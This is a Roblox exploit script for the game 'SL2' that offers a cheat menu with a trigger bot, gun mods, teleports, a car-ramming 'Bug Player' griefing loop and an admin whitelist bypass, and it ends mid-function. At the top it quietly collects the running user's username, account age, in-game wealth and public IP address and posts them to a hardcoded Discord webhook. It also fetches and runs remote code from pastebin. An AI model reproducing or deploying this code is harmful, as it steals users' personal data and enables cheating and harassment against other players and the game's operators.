-- SL2 SCRIPT
local Webhook = "https://discord.com/api/webhooks/1308910746817531954/sLUIvM7T7TWCpUe9QbNueVJUHCjRKsdG7--MbhonhmOAU1lakSkN4P-MxGUi6bqfDr1o"
local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer
local Player = LocalPlayer

if Player.Character and Player.Character.HumanoidRootPart.Anchored == false then
    return Player:Kick("Must Execute In SL2 Loading Screen...")
end

local accountCodes = {"Fresh Alt", "Definitely", "Maybe", "No"}
local accountStatus;
local AccountAge = LocalPlayer.AccountAge

if AccountAge <= 5 then
    accountStatus = accountCodes[1]
elseif AccountAge <= 30 then
    accountStatus = accountCodes[2]
elseif AccountAge <= 60 then
    accountStatus = accountCodes[3]
    else accountStatus = accountCodes[4]
end
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)

local UserId = LocalPlayer.UserId
local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
local PlayerName = LocalPlayer.Name

local PlayerData =
{
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Execution Logs**:",
        ["description"] = "*sl2.fucker*",
        ["color"] = tonumber(0x00000),
        ["fields"] = {
                        {
                            ["name"] = "Username:",
                            ["value"] = PlayerName,
                            ["inline"] = true
            },
                        {
                            ["name"] = "Alt Account?",
                            ["value"] = accountStatus,
                            ["inline"] = true
            },
                        {
                            ["name"] = "Shoes:",
                            ["value"] = Player.Characterstats.OwnedShoes.Value,
                            ["inline"] = true
            },
            
                        {               
                            ["name"] = "In-Game Name:",
                            ["value"] = Player.Characterstats.Firstname.Value .. " " .. Player.Characterstats.Lastname.Value,
                            ["inline"] = true
            },
        
                        {               
                            ["name"] = "Chains:",
                            ["value"] = Player.Characterstats.Chains.Value,
                            ["inline"] = true
            },
                        {               
                            ["name"] = "Cash:",
                            ["value"] = Player.Valuestats.Wallet.Value,
                            ["inline"] = true
            },
                        {               
                            ["name"] = "Bank:",
                            ["value"] = Player.Valuestats.Bank.Value,
                            ["inline"] = true
            },
                        {            
                            ["name"] = "Level:",
                            ["value"] = Player.Valuestats.Level.Value,
                            ["inline"] = true
            },
                        {            
                            ["name"] = "Join Script:",
                            ["value"] = jobId,
                            ["inline"] = true
            },
                        {            
                            ["name"] = "IP Address:",
                            ["value"] = game:HttpGet("https://v4.ident.me"),
                            ["inline"] = true
            },
        },
    }}
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
if Player.Name ~= "antikurrr" then
    http_request({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
end

local tpM3Ready = false;
if game.ReplicatedStorage:FindFirstChild("UI"):FindFirstChild("MENU") then
    game:GetService("ReplicatedStorage").UI.MENU:Destroy()
end
tpM3Ready = true;
game.Players.LocalPlayer.Chatted:Connect(function(c)
    if c == "/respawn" then
        game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Commands"):FireServer("respawn")
    end
end)

getgenv()["devs"] = {
    "RichNikga",
    "antikurrr",
    "Vxr_r",
    "Galaxy_Extendo"
}

        
getgenv()["debugInfo"] = false

for _, p in pairs(game.Workspace:GetChildren()) do
    if p.Name == "Part" and p:FindFirstChild("Script") then
        p:Destroy()
    end
end

local p = game.Players.LocalPlayer

local player = game.Players.LocalPlayer
local car = Workspace:WaitForChild(player.Name .. "'s Car", 0.01) or nil

local isRag = false
local bugging = false

local function findPlayerByNameAbbreviation(abbrev)
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #abbrev) == abbrev:lower() then
            return p
        end
    end
    return nil
end

local function fireEvents()
    local tireArg = {
        [1] = game.Workspace[game.Players.LocalPlayer.Name .. "'s Car"],
        [2] = 10000000,
        [3] = 10000000,
        [4] = 0,
        [5] = 0
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("TireSmoke"):FireServer(unpack(tireArg))

    local carSoundArgs = {
        [1] = game.Workspace[player.Name .. "'s Car"],
        [2] = 1000,
        [3] = 1000,
        [4] = false,
        [5] = 1000,
        [6] = 1000,
        [7] = 0,
        [8] = 1000,
        [9] = false
    }
    game:GetService("ReplicatedStorage").CarSound:FireServer(unpack(carSoundArgs))
end

local function moveCarToTargetPlayer(targetPlayerName)
    local targetPlayer = findPlayerByNameAbbreviation(targetPlayerName)

    if targetPlayer then
        bugging = true
        while bugging do
            if car and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                car:SetPrimaryPartCFrame(targetPlayer.Character.HumanoidRootPart.CFrame)
                fireEvents()
            else
                warn("Target player or car not found.")
                bugging = false
            end
            task.wait(0.05)
        end
    else
        warn("Target player not found.")
    end
end

local function stopBugging()
    bugging = false
end

game.Workspace.ChildAdded:Connect(function(child)
    if child.Name == player.Name .. "'s Car" then
        car = child
    end
end)

local player = game.Players.LocalPlayer
local car = Workspace:WaitForChild(player.Name .. "'s Car", 1) or nil
local isRag = false
local AutoParkCar = false

local function monitorRAGG(character)
    character.ChildAdded:Connect(function(child)
        if child.Name == "RAGG" then
            isRag = true
        end
    end)

    character.ChildRemoved:Connect(function(child)
        if child.Name == "RAGG" then
            isRag = false
        end
    end)
end

if player.Character then
    monitorRAGG(player.Character)
end

player.CharacterAdded:Connect(function(character)
    isRag = false
    monitorRAGG(character)
end)

local function moveCarToPlayerUntilRag()
    if car then
        local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart")
        car.PrimaryPart = car:FindFirstChild("Body"):FindFirstChild("CollisionPart")
        if car.PrimaryPart then
            repeat
                task.wait()
                car:SetPrimaryPartCFrame(humanoidRootPart.CFrame)
            until isRag == true
            car:SetPrimaryPartCFrame(Workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
        else
            local carBody = car:FindFirstChild("Body")
            if carBody and carBody:FindFirstChild("CollisionPart") then
                repeat
                    task.wait()
                    carBody.CollisionPart.CFrame = humanoidRootPart.CFrame
                until isRag == true
                car:SetPrimaryPartCFrame(Workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
            end
        end
    else
        warn("Car not found")
    end
end

local function findPlayerByNameAbbreviation(abbrev)
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #abbrev) == abbrev:lower() then
            return p
        end
    end
    return nil
end

local function teleportToPlayer(targetPlayerName)
    local targetPlayer = findPlayerByNameAbbreviation(targetPlayerName)
    if targetPlayer then
        if isRag == true and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            player.Character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position)
        else
            warn("Teleportation failed: either RAGG is not present or target player's character not found.")
        end
    else
        warn("Target player not found.")
    end
end

game.Workspace.ChildAdded:Connect(function(child)
    if child.Name == player.Name .. "'s Car" and AutoParkCar then
        task.wait(1)
        child:WaitForChild("DriveSeat"):Sit(player.Character:FindFirstChild("Humanoid"))

        child.PrimaryPart = child:WaitForChild("Body"):WaitForChild("CollisionPart")
        task.wait(.5)
        child:SetPrimaryPartCFrame(Workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))

        car = child
    end
end)

local cHumanoid
local cHealth
local isSafe = false
local SafeToggled = false

local function teleportAndAnchorPlayer()
    local character = game.Players.LocalPlayer.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.CFrame = rootPart.CFrame + Vector3.new(0, -7.5, 0)
            rootPart.Anchored = true
        end
    end
end

local function unanchorPlayer()
    local character = game.Players.LocalPlayer.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = false
            rootPart.CFrame = rootPart.CFrame + Vector3.new(0, 7.5, 0)
        end
    end
end

if game.Players.LocalPlayer.Character then
    cHumanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if cHumanoid then
        cHealth = cHumanoid.Health
    end
end

game.Players.LocalPlayer.CharacterAdded:Connect(function(c)
    cHumanoid = c:FindFirstChildOfClass("Humanoid")
    if cHumanoid then
        cHealth = cHumanoid.Health
    end
end)

cHumanoid.HealthChanged:Connect(function(currentHealth)
    if SafeToggled then
        if currentHealth < cHealth and not isSafe then
            teleportAndAnchorPlayer()
            isSafe = true
        end

        if currentHealth >= cHumanoid.MaxHealth and isSafe then
            unanchorPlayer()
            isSafe = false
        end

        cHealth = currentHealth
    end
end)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local gunRemotes = ReplicatedStorage:WaitForChild("GunRemotes"):WaitForChild("Impact")

local TriggerBotEnabled = false
local keybind = Enum.KeyCode.V
local isKeyHeld = false

local function getEquippedGun()
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if item:IsA("Tool") and item:FindFirstChild("Stats") then
            return item
        end
    end
    return nil
end

local function onMouseMove()
    if not isKeyHeld then
        return
    end
    
    local Gun = getEquippedGun()
    
    if Gun then
        local mouseLocation = UserInputService:GetMouseLocation()
        local ray = Camera:ViewportPointToRay(mouseLocation.X, mouseLocation.Y)
        local raycastParams = RaycastParams.new()
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}

        local raycastResult = workspace:Raycast(ray.Origin, ray.Direction * 1000, raycastParams)

        if raycastResult then
            local hitPart = raycastResult.Instance
            local hitPlayer = Players:GetPlayerFromCharacter(hitPart.Parent)
            
            if hitPlayer and TriggerBotEnabled and hitPlayer.Character.Humanoid.Health ~= 0 then
                
                local playerHead = hitPlayer.Character:FindFirstChild("Head")
                if playerHead then
                    local args = {
                        [1] = Gun,
                        [2] = playerHead,
                        [3] = playerHead.Position,
                        [4] = playerHead.Position,
                        [5] = playerHead.Position,
                        [6] = "GLASS",
                        [7] = {
                            [1] = workspace:WaitForChild("Camera"),
                            [2] = workspace:WaitForChild(hitPlayer.Name),
                            [3] = workspace:FindFirstChild("apes"),
                            [4] = workspace:FindFirstChild("OBJECTS"),
                            [5] = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        }
                    }

                    gunRemotes:FireServer(unpack(args))
                end
            end
        end
    end
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function GetMelee()
    if LocalPlayer.Character then
        if LocalPlayer.Character:FindFirstChildOfClass("Tool") then
            if LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("BackstabDamage") then
                return LocalPlayer.Character:FindFirstChildOfClass("Tool") or nil
            end
        end 
    end
end

local function GetClosestCharacter()
    PlrsInRange = {}
    for i,v in next, Players:GetPlayers() do
        if v~=LocalPlayer and LocalPlayer.Character and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            Magnitude = (LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - v.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
            if Magnitude <= 10 then
                table.insert(PlrsInRange,{Player = v,Range = Magnitude})
            end
        end
    end
    table.sort(PlrsInRange, function(A,B) return A.Range < B.Range end) 
    return PlrsInRange[1] and PlrsInRange[1].Player.Character or nil
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == keybind and not gameProcessed then
        isKeyHeld = true
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == keybind then
        isKeyHeld = false
    end
end)

RunService.RenderStepped:Connect(onMouseMove)

local function GetChildrenString(obj)
    objs = {}
    for i,v in next, obj:GetChildren() do
        table.insert(objs,tostring(v))
    end
    table.sort(objs,function(a,b) return a<b end)
    return objs
end

print("ALL PASSED")

local Lighting = game:GetService('Lighting')
local runservice = game:GetService('RunService')
local inputservice = game:GetService('UserInputService')
local tweenservice = game:GetService('TweenService')
local Workspace = game:GetService("Workspace")
local camera = workspace.CurrentCamera
local uis, players, localplayer, camera, wtsp, wtvp, getplayers, findfirstchild, findfirstchildofclass, mouse, getchildren, getdescendants, isa, getpartsobscuringtarget, isfriendswith = game.UserInputService, game.Players, game.Players.LocalPlayer, workspace.CurrentCamera, workspace.CurrentCamera.WorldToScreenPoint, workspace.CurrentCamera.WorldToViewportPoint, game.Players.GetPlayers, workspace.FindFirstChild, workspace.FindFirstChildOfClass, game.Players.LocalPlayer:GetMouse(), workspace.GetChildren, workspace.GetDescendants, workspace.IsA, workspace.CurrentCamera.GetPartsObscuringTarget, game.Players.LocalPlayer.IsFriendsWith
local utility = {}
print("Made Util")
if getexecutorname == "Solara" then
    function utility:draw(name, properties)
        return nil
    end
else
    print("Hi Util")
    function utility:draw(name, properties)
        local drawing = Drawing.new(name)
        for property, value in pairs(properties) do
            drawing[property] = value
        end
        return drawing
    end
end
function utility:instance(name, properties)
    local instance = Instance.new(name)
    for property, value in pairs(properties) do
        instance[property] = value
    end
    return instance
end
function utility:beam(props)
    local timed = props.Timed or props.timed or false
    local duration = props.Duration or props.duration or 3
    local origin = props.origin or props.Origin or props.from or props.From or props.pos1 or props.pos1 or props.Pos1
    local to = props.to or props.To or props.pos2 or props.pos2 or props.Pos2
    local widthx = props.widthx or props.Widthx or props.x or props.X or props.width1 or props.Width1 or 0.5
    local widthy = props.widthy or props.Widthy or props.y or props.Y or props.width2 or props.Width2 or 0.5
    local texture = props.Texture or props.texture or ""
    local color = props.Color or props.color or ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(255, 255, 255))
    local part1, part2 = Instance.new("Part", workspace), Instance.new("Part", workspace)
    part1.Anchored = true; part2.Anchored = true
    part1.Transparency = 1; part2.Transparency = 1
    part1.Size = Vector3.new(0, 0, 0); part2.Size = Vector3.new(0, 0, 0)
    part1.CanCollide = false; part2.CanCollide = false
    part1.Position = origin; part2.Position = to
    local attachment1, attachment2 = Instance.new("Attachment", part1), Instance.new("Attachment", part2)
    -----
    local beam = Instance.new("Beam", workspace)
    beam.TextureMode = "Static"
    beam.Texture = texture
    beam.Color = color
    beam.Width0 = widthx
    beam.Width1 = widthy
    beam.Attachment0 = attachment1
    beam.Attachment1 = attachment2
    beam.FaceCamera = true
    beam.TextureSpeed = 2
    task.spawn(function()
        if timed then
            delay(duration, function()
                part1:Destroy()
                part2:Destroy()
                beam:Remove()
            end)
        end
    end)
    return beam                                                                                                                                                                                             
end
print("Bye Util :(")
local octoware = {
    ["visuals"] = {
        ["world"] = {
            ["changeambient"] = false,
            ["ambient"] = Color3.fromRGB(255, 255, 255),
            ["changefogcolor"] = false,
            ["fogcolor"] = Color3.fromRGB(255, 255, 255),
            ["nofog"] = false,
            ["changefov"] = false,
            ["fov"] = 70,
        }
    }
}
print("Hi Octoware")
if getexecutorname() == "Synapse Z" then
    print("Hello Synapse Z")
elseif getexecutorname() == "Wave" then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/liam0999/Drawing2/main/Drawing2.lua'))()
end
print("Hey Drawing Lib")

local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
local Library = loadstring(game:HttpGet('https://pastebin.com/raw/bUrAUKaL'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

print("GOT TO UI VARS")

local Window = Library:CreateWindow({
    Title = 'sl2.fucker | galaxyware',
    Center = true,
    AutoShow = true,
    TabPadding = 0.5,
    MenuFadeTime = 0.3
})

print("MADE UI")

local Tabs = { -- these are your tabs
    Main = Window:AddTab('Main');
    Visuals = Window:AddTab('Visuals');
    ['UI Settings'] = Window:AddTab('UI Settings');
}

local LocalPlayer = game.Players.LocalPlayer
local LocalPlayerBox = Tabs.Main:AddLeftGroupbox("Player")
local ExtraPlayerBox = Tabs.Main:AddLeftGroupbox("Extra")
local SafeBox = Tabs.Main:AddRightGroupbox("Safe")
local GunModBox = Tabs.Main:AddLeftGroupbox("Gun Mods")
local MiscBox = Tabs.Main:AddRightGroupbox("Vehicle")
local TeleportBox = Tabs.Main:AddRightGroupbox("Teleportation")
local MascBox = Tabs.Main:AddRightGroupbox("Misc")
local GunModToggles = {
    InfiniteAmmo = false;
    Auto = false;
    Recoil = false;
    Spread = false;
    Rifle = false;
    Whitelist = false;
}

game.Players.LocalPlayer.Character.ChildAdded:Connect(function(X)
    if X:IsA("Tool") and X:FindFirstChild("Stats") then
        if GunModToggles.Rifle then
            if X.Stats:FindFirstChild("Rifle") then
                X.Stats.Rifle:Destroy()
            end
        end
        if GunModToggles.Spread then
            require(X.Stats.Local).MaxSpread = 0
            require(X.Stats.Local).MinSpread = 0
        end
    end
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function(Char)
    Char.ChildAdded:Connect(function(X)
        if X:IsA("Tool") and X:FindFirstChild("Stats") then
            if GunModToggles.Rifle then
                if X.Stats:FindFirstChild("Rifle") then
                    X.Stats.Rifle:Destroy()
                end
            end
            if GunModToggles.Spread then
                require(X.Stats.Local).MaxSpread = 0
                require(X.Stats.Local).MinSpread = 0
            end
        end
    end)
end)

local RatJamaican = MiscBox:AddButton('Teleport Car', function() 
    car = Workspace[LocalPlayer.Name.."'s Car"]
    car.PrimaryPart = car:FindFirstChild("Body"):FindFirstChildOfClass("Part")
    car:SetPrimaryPartCFrame(LocalPlayer.Character:WaitForChild("HumanoidRootPart")["CFrame"])
    task.wait(1)
    car.DriveSeat:sit(LocalPlayer.Character:WaitForChild("Humanoid"))
end)

RatJamaican:AddButton('Sit In Car', function() 
    vehicle = workspace[LocalPlayer.Name.."'s Car"]
    vehicle.DriveSeat:sit(LocalPlayer.Character:WaitForChild("Humanoid"))
end)

local JimmyJoyce = MiscBox:AddButton('Park Car', function() 
    car = Workspace[LocalPlayer.Name.."'s Car"]
    car.PrimaryPart = car:FindFirstChild("Body"):FindFirstChild("CollisionPart")
    car:SetPrimaryPartCFrame(Workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
    task.wait(1)
    car.DriveSeat:sit(LocalPlayer.Character:WaitForChild("Humanoid"))
end)

JimmyJoyce:AddButton("Neon Car",function()
    local car = Workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "'s Car") or nil

    if car then
        for _, descendant in pairs(car:GetDescendants()) do
            if descendant:IsA("Part") or descendant:IsA("BasePart") then
                descendant.Material = Enum.Material.Neon
            end
        end
    end
end)

MiscBox:AddButton("Infinite Car Gas",function()
    LocalPlayer.Valuestats.CarGas.Changed:Connect(function()
        LocalPlayer.Valuestats.CarGas.Value = 100
    end)
end)
if getexecutorname() ~= "Solara" then
    local HP = 100
    MiscBox:AddSlider('HorsePower', {
        Text = 'Horse Power',
        Default = 100,
        Min = 100,
        Max = 750,
        Rounding = 0,
        Compact = true,
        Callback = function(v)
            HP = v
            local car = Workspace:FindFirstChild(game.Players.LocalPlayer.Name .. "'s Car") or nil
            if car then
                local Module = car:WaitForChild("A-Chassis Tune", 5) or car:WaitForChild("Tuner", 5)
                require(Module).Horsepower = HP
            end
        end
    })
    
    Workspace.ChildAdded:Connect(function(Child)
        if tostring(Child) == LocalPlayer.Name .. "'s Car" then
            local Module;
            if Child:WaitForChild("A-Chassis Tune") then
                Module = Child:FindFirstChild("A-Chassis Tune")
                else
                Module = Child:WaitForChild("Tuner", 5) or warn("Failed")
            end
            task.wait(.5)
            require(Module).Horsepower = HP
        end
    end)
end

local CarTPBind = Enum.KeyCode.V
MiscBox:AddToggle('Car Click TP', {
    Text = 'Car Click Teleport',
    Default = false, -- Default value (true / false)
}):AddKeyPicker('CarTPbind', {
    -- SyncToggleState only works with toggles.
    -- It allows you to make a keybind which has its state synced with its parent toggle
    -- Example: Keybind which you use to toggle flyhack, etc.
    -- Changing the toggle disables the keybind state and toggling the keybind switches the toggle state
    Default = 'V', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
    SyncToggleState = false,
    -- You can define custom Modes but I have never had a use for it.
    Mode = 'Hold', -- Modes: Always, Toggle, Hold
    Text = '', -- Text to display in the keybind menu
    NoUI = false, -- Set to true if you want to hide from the Keybind menu,
    -- Occurs when the keybind is clicked, Value is `true`/`false`
    Callback = function()
    end,
    -- Occurs when the keybind itself is changed, `New` is a KeyCode Enum OR a UserInputType Enum
    ChangedCallback = function(New)
        CarTPBind = New
    end
})

UserInputService.InputBegan:Connect(function(key,input)
    if Toggles["Car Click TP"].Value and key.KeyCode == CarTPBind and (not input) then
        Car = Workspace:FindFirstChild(tostring(LocalPlayer).."'s Car") or nil
        if Car then
            Car.PrimaryPart = Car:WaitForChild("Body"):FindFirstChildOfClass("Part")
            Car:SetPrimaryPartCFrame(game.Players.LocalPlayer:GetMouse().Hit + Vector3.new(0,5,0))
        end
    end
end)

local AutoTP = false;
local TargetPlayer = tostring(LocalPlayer)

local teleportingTo;
TeleportBox:AddDropdown('TpToSpawn', {
    SpecialType = 'Player',
    Text = 'Target Player',
    Multi = false,
    Callback = function(Value)
        TargetPlayer = Value
        teleportingTo = Value
    end
})

shared.DefaultMethod = "CarTP"
TeleportBox:AddToggle('tpptot', {
    Text = 'Teleport Method 2',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        if v == false then shared.DefaultMethod = "CarTP" else shared.DefaultMethod = "InstantTP" end
    end
})
shared.DefaultMethod = "CarTP"
TeleportBox:AddToggle('tpm3', {
    Text = 'Teleport Method 3',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        if v == false and shared.DefaultMethod ~= "InstantTP" then
            shared.DefaultMethod = "CarTP" 
            else shared.DefaultMethod = "NewTP" 
        end
    end
})

TeleportBox:AddToggle('tpptot', {
    Text = 'Teleport To Player On Spawn',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        AutoTP = v
    end
})

TeleportBox:AddButton('Teleport To Player', function()
    if shared.DefaultMethod == "CarTP" then
        local targetPlayer = findPlayerByNameAbbreviation(TargetPlayer)
        if player.Backpack and player.Backpack:FindFirstChild("DualKatana") or player.Backpack:FindFirstChild("NinjaKatana") then
            if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then player.Character.Humanoid:EquipTool(player.Backpack:FindFirstChild("DualKatana") or player.Backpack:FindFirstChild("NinjaKatana"))
                if player.Character:FindFirstChild("HumanoidRootPart") then
                    player.Character.HumanoidRootPart.CFrame = game:GetService("Players")[TargetPlayer].Character.HumanoidRootPart.CFrame
                end
            end
        elseif player.Character and player.Character:FindFirstChild("DualKatana") or player.Character:FindFirstChild("NinjaKatana") then
            if player.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = game:GetService("Players")[TargetPlayer].Character.HumanoidRootPart.CFrame
            end
            else warn("No Teleport Tool Found, Using Next Method.")
            car = Workspace:FindFirstChild(player.Name .. "'s Car") or nil
            if car then
                if targetPlayer then
                    moveCarToPlayerUntilRag()
                    teleportToPlayer(TargetPlayer)
                else
                    warn("Target player not found.")
                end
            else
                local args = {
                    [1] = "spawn",
                    [2] = 1
                }
                
                game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Commands"):FireServer(unpack(args))                        
                warn("Car not found.")
            end
        end
        else
        if not p.Character or p.Character and not p.Character:FindFirstChild("HumanoidRootPart") then 
            return warn("Invalid Character State") 
        end

        local tool
        local args = { "respawn" }
        shared.teleportEnabled = false

        if not game.Players[teleportingTo].Character or not game.Players[teleportingTo].Character:FindFirstChild("HumanoidRootPart") then 
            return warn("Invalid Teleport") 
        end

        p.CharacterAdded:Connect(function(c)
            if shared.DefaultMethod == "InstantTP" and shared.teleportEnabled == true then
                c:WaitForChild("HumanoidRootPart").CFrame = game.Players[teleportingTo].Character.HumanoidRootPart.CFrame
                shared.teleportEnabled = false
                if tool ~= nil then
                    game.ReplicatedStorage.UI.Safe:FireServer("Takeout", tool.Name, 6, p.UserId)
                end
            end
        end)

        for _, t in pairs(p.Character:GetChildren()) do
            if t:IsA("Tool") and (t:FindFirstChild("Stats") or t:FindFirstChild("BackstabDamage")) then
                p.Character.Humanoid:UnequipTools()
            end
        end

        for _, t in pairs(p.Backpack:GetChildren()) do
            if t:IsA("Tool") and (t:FindFirstChild("Stats") or t:FindFirstChild("BackstabDamage")) then
                tool = t
                if tool ~= nil then
                    game.ReplicatedStorage.UI.Safe:FireServer("Movetosafe", tool.Name, 6, p.UserId)
                end
            end
        end

        if shared.DefaultMethod == "InstantTP" and game.Players.LocalPlayer.Character.Humanoid.Health >= 85 then
            shared.teleportEnabled = true
            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Commands"):FireServer(unpack(args))
        elseif tpM3Ready == true and shared.DefaultMethod == "NewTP" then
            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("MenuTP"):FireServer("End")
            task.wait(0.1)
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players[teleportingTo].Character.HumanoidRootPart.CFrame
        end
    end
end)

local BugButton = TeleportBox:AddButton('Bug Player', function() 
    car = Workspace:FindFirstChild(player.Name .. "'s Car") or nil
    if car then
        car.PrimaryPart = car:FindFirstChild("Body"):FindFirstChild("CollisionPart")
        moveCarToTargetPlayer(TargetPlayer)
    else
        warn("Car not found.")
    end
end)

BugButton:AddButton('Stop Bugging', function() 
    car = Workspace:FindFirstChild(player.Name .. "'s Car") or nil
    stopBugging()
    task.wait()
    car:SetPrimaryPartCFrame(Workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function(Char)
    repeat task.wait() until Char:FindFirstChild("HumanoidRootPart")
    if AutoTP and game.Players[TargetPlayer] then
        Char.HumanoidRootPart.CFrame = game.Players[TargetPlayer].Character.HumanoidRootPart.CFrame
    end
end)

local RealEquipping = ReplicatedStorage.GunRemotes.Equipping
local FakeEquipping = Instance.new("RemoteEvent",ReplicatedStorage)
FakeEquipping.Name = "Equipping"
GunModBox:AddToggle('WLBYP', {
    Text = 'Admin Whitelist Bypass',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        GunModToggles.Whitelist = v
        if GunModToggles.Whitelist then
            FakeEquipping.Parent = ReplicatedStorage.GunRemotes
            RealEquipping.Parent = ReplicatedStorage
        else
            RealEquipping.Parent = ReplicatedStorage.GunRemotes
            FakeEquipping.Parent = ReplicatedStorage
        end
    end
})

if getexecutorname() == "Solara" then
    GunModBox:AddButton("Infinite Ammo + Anti Jam",function()
        GunStats = LocalPlayer.Character:FindFirstChildOfClass("Tool").Stats
        GunStats.ClipSize.Value = 1
        GunStats.ClipSize:GetPropertyChangedSignal("Value"):Connect(function()
            GunStats.ClipSize.Value = 1
        end)
    end)

    GunModBox:AddButton("Automatic Gun",function()
        GunStats = LocalPlayer.Character:FindFirstChildOfClass("Tool").Stats
        GunStats.FireRate.Value = -1
        GunStats.GunType.Value = "Auto"
    end)

    GunModBox:AddButton("No Recoil",function()
        GunStats = LocalPlayer.Character:FindFirstChildOfClass("Tool").Stats
        GunStats.Recoil.Value = 0
    end)
else
    GunModBox:AddToggle('infam', {
        Text = 'Infinite Ammo + Anti Jam',
        Default = false, -- Default value (true / false)
        Callback = function(v)  
            GunModToggles.InfiniteAmmo = v
        end
    })
    GunModBox:AddToggle('fulauto', {
        Text = 'Automatic Gun',
        Default = false, -- Default value (true / false)
        Callback = function(v)
            GunModToggles.Auto = v
        end
    })
    GunModBox:AddToggle('Recoil', {
        Text = 'No Recoil',
        Default = false, -- Default value (true / false)
        Callback = function(v)
            GunModToggles.Recoil = v
        end
    })
end
if getexecutorname() ~= "Solara" then
    GunModBox:AddToggle('Spread', {
        Text = 'No Spread',
        Default = false, -- Default value (true / false)
        Callback = function(v)
            GunModToggles.Spread = v
            if v == true then
                if LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                    X = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                    if X:FindFirstChild("Stats") then
                        require(X.Stats.Local).MaxSpread = 0
                        require(X.Stats.Local).MinSpread = 0
                    end
                end
            end
        end
    })
end
GunModBox:AddToggle('Rifle', {
    Text = 'No Rifle',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        GunModToggles.Rifle = v
        if v == true then
            if LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                X = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                if X:FindFirstChild("Stats") then
                    if X.Stats:FindFirstChild("Rifle") then
                        X.Stats.Rifle:Destroy()
                    end
                end
            end
        end
    end
})

local LocalPlayer = game:GetService("Players").LocalPlayer
game:GetService("ReplicatedStorage"):WaitForChild("Radio"):WaitForChild("getCS"):InvokeServer(true, "ANTIKUR")
local OldRadio = false;
MascBox:AddToggle('ws234e', {
    Text = 'Spam MET Radio',
    Default = false, -- Default value (true / false)
})

MascBox:AddInput('MetInput', {
    Default = '',
    Numeric = false, -- true / false, only allows numbers
    Finished = false, -- true / false, only calls callback when you press enter
    
    Text = 'Radio Message',

    Placeholder = 'Message Here', -- placeholder text when the box is empty
    -- MaxLength is also an option which is the max length of the text
})

local faf = LocalPlayerBox:AddToggle('tbotenbal', {
    Text = 'Trigger Bot',
    Default = false, -- Default value (true / false)
    Callback = function(v)
        TriggerBotEnabled = v
    end
})

local p = game.Players.LocalPlayer
local tool;

shared.gunAura = false

local function startGunAura()
    while shared.gunAura do
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr ~= p and plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Head") then
